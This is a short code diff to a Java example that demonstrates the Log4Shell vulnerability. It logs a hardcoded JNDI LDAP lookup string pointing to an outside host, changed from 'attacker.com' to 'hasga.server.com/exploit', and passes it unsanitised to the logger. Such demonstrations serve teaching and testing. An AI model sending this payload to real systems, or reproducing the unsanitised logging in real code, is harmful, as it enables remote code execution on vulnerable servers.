@@ -7,11 +7,17 @@ public class Log4ShellExample {
 
     public static void main(String[] args) {
         
-        String userInput = "${jndi:ldap://attacker.com/a}";
+        String userInput = "${jndi:ldap://hasga.server.com/exploit}";
+
         
-        logger.error("User input: " + userInput);
+        logUserInput(userInput);
         
         System.out.println("Log4Shell vulnerable example executed.");
+    }
+
+    private static void logUserInput(String input) {
+    
+        logger.error("User input logged: " + input);
     }
 }
 
